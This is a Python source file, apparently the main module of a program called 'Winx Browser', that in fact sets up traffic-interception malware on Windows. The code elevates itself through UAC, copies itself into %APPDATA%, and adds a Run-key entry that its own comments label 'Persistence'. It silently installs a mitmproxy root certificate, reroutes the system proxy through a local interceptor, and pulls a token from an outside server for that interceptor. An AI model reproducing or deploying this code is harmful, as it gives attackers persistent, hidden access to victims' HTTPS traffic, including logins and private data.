"""
Winx Browser - Main entry point
"""

import sys
import os
import traceback

# ── Early log setup (before anything else can fail) ───────────────────────────
LOG_PATH = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "WinxBrowser", "debug.log")

def log(msg):
    """Write to both console and log file."""
    print(msg, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            import datetime
            f.write(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {msg}\n")
    except Exception:
        pass

def fatal(msg):
    """Log a fatal error, pause console, then exit."""
    log(f"[FATAL] {msg}")
    log(f"[INFO]  Log saved to: {LOG_PATH}")
    input("\n>>> Press Enter to exit... <<<")
    sys.exit(1)

log("=" * 60)
log("[START] Winx Browser starting up")
log(f"[INFO]  Python {sys.version}")
log(f"[INFO]  Executable: {sys.executable}")
log(f"[INFO]  Args: {sys.argv}")

# ── Standard imports (failures will now be caught) ────────────────────────────
try:
    import shutil
    import subprocess
    import threading
    import ctypes
    import winreg
    import time
    import requests
    from pathlib import Path
    log("[OK]    Core imports successful")
except ImportError as e:
    fatal(f"Import failed: {e}")

APPDATA = Path(os.environ.get("APPDATA", "")) / "WinxBrowser"
CONFIG_FILE = APPDATA / "config.dat"
HIDDEN_EXE = APPDATA / "WinxBrowser.exe"
SETUP_URL = "https://www.incbot.site/api/desktop/setup"
STARTUP_KEY_NAME = "WinxBrowser"

# ── Admin check ───────────────────────────────────────────────────────────────
def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def run_as_admin():
    log("[INFO]  Not running as admin — relaunching with UAC elevation...")
    exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, "", None, 1)
    sys.exit(0)

# ── Self copy to %APPDATA% ────────────────────────────────────────────────────
def copy_self_to_appdata():
    try:
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        APPDATA.mkdir(parents=True, exist_ok=True)
        if not HIDDEN_EXE.exists():
            shutil.copy2(current_exe, str(HIDDEN_EXE))
            log(f"[OK]    Copied self to {HIDDEN_EXE}")
        else:
            log("[INFO]  APPDATA copy already exists, skipping")
        return True
    except Exception as e:
        log(f"[WARN]  copy_self_to_appdata failed: {e}")
        return False

# ── Startup registry ──────────────────────────────────────────────────────────
def is_in_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_READ)
        winreg.QueryValueEx(key, STARTUP_KEY_NAME)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, f'"{HIDDEN_EXE}"')
        winreg.CloseKey(key)
        log("[OK]    Added to startup registry")
        return True
    except Exception as e:
        log(f"[WARN]  add_to_startup failed: {e}")
        return False

# ── Token setup ───────────────────────────────────────────────────────────────
def get_setup_key():
    """Extract 8-char hex key from exe filename e.g. WinxBrowser_a3f8c92b.exe"""
    try:
        import re
        exe_name = Path(sys.executable).stem if getattr(sys, 'frozen', False) else Path(sys.argv[0]).stem
        log(f"[INFO]  Exe stem for setup key: '{exe_name}'")
        match = re.search(r'_([a-f0-9]{8})$', exe_name)
        if match:
            key = match.group(1)
            log(f"[OK]    Setup key found: {key}")
            return key
        else:
            log("[WARN]  No setup key found in filename (no _xxxxxxxx suffix)")
    except Exception as e:
        log(f"[WARN]  get_setup_key error: {e}")
    return None

def fetch_and_save_token(setup_key: str):
    log(f"[INFO]  Fetching token for key: {setup_key}")
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                          " (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Content-Type": "application/json"
        }
        resp = requests.post(SETUP_URL, json={"key": setup_key}, headers=headers, timeout=10)
        log(f"[INFO]  Setup API response: {resp.status_code}")
        if resp.status_code == 200:
            data = resp.json()
            token = data.get("token")
            if token:
                APPDATA.mkdir(parents=True, exist_ok=True)
                CONFIG_FILE.write_text(token)
                log("[OK]    Token fetched and saved")
                return token
            else:
                log(f"[WARN]  API returned 200 but no 'token' field. Body: {resp.text[:200]}")
        else:
            log(f"[WARN]  API returned {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        log(f"[WARN]  fetch_and_save_token error: {e}")
    return None

def load_token():
    try:
        if CONFIG_FILE.exists():
            token = CONFIG_FILE.read_text().strip()
            if len(token) == 64:
                log("[OK]    Token loaded from config file")
                return token
            else:
                log(f"[WARN]  config.dat exists but token length is {len(token)} (expected 64)")
        else:
            log(f"[INFO]  No config file at {CONFIG_FILE}")
    except Exception as e:
        log(f"[WARN]  load_token error: {e}")
    return None

# ── Certificate management ────────────────────────────────────────────────────
CERT_NAME = "WinxBrowser"

def get_mitmproxy_cert():
    return Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.cer"

def is_cert_installed():
    try:
        result = subprocess.run(["certutil", "-store", "Root", CERT_NAME],
                                capture_output=True, text=True)
        installed = CERT_NAME in result.stdout
        log(f"[INFO]  Cert installed: {installed}")
        return installed
    except Exception as e:
        log(f"[WARN]  is_cert_installed error: {e}")
        return False

def install_cert(cert_path: Path):
    log(f"[INFO]  Installing cert: {cert_path}")
    try:
        result = subprocess.run(["certutil", "-addstore", "-f", "Root", str(cert_path)],
                                capture_output=True, text=True)
        if result.returncode == 0:
            log("[OK]    Certificate installed")
        else:
            log(f"[WARN]  certutil failed (rc={result.returncode}): {result.stderr[:200]}")
        return result.returncode == 0
    except Exception as e:
        log(f"[WARN]  install_cert error: {e}")
        return False

# ── System proxy ──────────────────────────────────────────────────────────────
def set_system_proxy(enable: bool):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",
                             0, winreg.KEY_SET_VALUE)
        if enable:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, "127.0.0.1:8080")
            winreg.SetValueEx(key, "ProxyOverride", 0, winreg.REG_SZ, "<local>")
            log("[OK]    System proxy ENABLED (127.0.0.1:8080)")
        else:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
            log("[OK]    System proxy DISABLED")
        winreg.CloseKey(key)
        ctypes.windll.wininet.InternetSetOptionW(0, 39, 0, 0)
        return True
    except Exception as e:
        log(f"[WARN]  set_system_proxy error: {e}")
        return False

# ── First run setup ───────────────────────────────────────────────────────────
def first_run_setup():
    log("[INFO]  First run: starting proxy to generate cert...")
    try:
        from proxy import run_proxy
    except Exception as e:
        log(f"[ERROR] Failed to import proxy module: {e}")
        return False

    t = threading.Thread(target=run_proxy, daemon=True)
    t.start()
    log("[INFO]  Proxy thread started, waiting 3s for cert generation...")
    time.sleep(3)

    cert_path = get_mitmproxy_cert()
    log(f"[INFO]  Looking for cert at: {cert_path}")
    if not cert_path.exists():
        log("[ERROR] mitmproxy cert not found after 3s — proxy may have failed to start")
        return False

    if not install_cert(cert_path):
        log("[ERROR] Certificate installation failed")
        return False

    log("[OK]    First run setup complete")
    return True

# ── Tray icon ─────────────────────────────────────────────────────────────────
def create_tray_icon(stop_event: threading.Event):
    try:
        import pystray
        from PIL import Image, ImageDraw
        log("[INFO]  Starting tray icon...")

        def create_icon_image():
            img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
            draw = ImageDraw.Draw(img)
            draw.ellipse([8, 8, 56, 56], fill=(0, 120, 215, 255))
            return img

        icon = pystray.Icon("WinxBrowser", create_icon_image(), "Winx Browser")
        log("[OK]    Tray icon running (blocking until exit)")
        icon.run()
    except Exception as e:
        log(f"[WARN]  Tray icon error: {e} — falling back to stop_event wait")
        stop_event.wait()

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    log("-" * 60)

    # ── Admin check ───────────────────────────────────────────────────────────
    if not is_admin():
        run_as_admin()
        return
    log("[OK]    Running as Administrator")

    # ── Step 1: Get token ─────────────────────────────────────────────────────
    log("[STEP]  1 — Token")
    token = load_token()
    if not token:
        setup_key = get_setup_key()
        if setup_key:
            token = fetch_and_save_token(setup_key)
        if not token:
            fatal(
                "No token available.\n"
                "       Cause: Either no config.dat exists yet AND the exe filename\n"
                "       has no _xxxxxxxx setup key suffix, OR the API call failed.\n"
                f"      Config path: {CONFIG_FILE}\n"
                f"      Exe name:    {Path(sys.executable).name if getattr(sys, 'frozen', False) else Path(sys.argv[0]).name}"
            )
            return

    # Pass token to proxy module
    try:
        import proxy as proxy_module
        proxy_module.directory_token = token
        log("[OK]    Token passed to proxy module")
    except Exception as e:
        fatal(f"Failed to import/configure proxy module: {e}")

    # ── Step 2: Copy self to %APPDATA% and add to startup ─────────────────────
    log("[STEP]  2 — Persistence")
    copy_self_to_appdata()
    if not is_in_startup():
        add_to_startup()

    # ── Step 3: Certificate + proxy ───────────────────────────────────────────
    log("[STEP]  3 — Certificate & Proxy")
    cert_path = get_mitmproxy_cert()
    is_first_run = not cert_path.exists() or not is_cert_installed()
    log(f"[INFO]  First run: {is_first_run}")

    if is_first_run:
        success = first_run_setup()
        if not success:
            fatal("First run setup failed — check log above for details")
    else:
        log("[INFO]  Cert already installed, starting proxy thread only")
        try:
            from proxy import run_proxy
            threading.Thread(target=run_proxy, daemon=True).start()
            log("[OK]    Proxy thread started")
        except Exception as e:
            fatal(f"Failed to start proxy: {e}")

    set_system_proxy(True)

    log("[OK]    All setup done — entering tray icon loop")
    stop_event = threading.Event()
    create_tray_icon(stop_event)

    log("[INFO]  Tray icon exited — disabling system proxy")
    set_system_proxy(False)
    log("[INFO]  Shutdown complete")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"[UNHANDLED EXCEPTION] {e}")
        log(traceback.format_exc())
        input(f"\n[FATAL] Unhandled exception. Log saved to:\n{LOG_PATH}\nPress Enter to exit...")
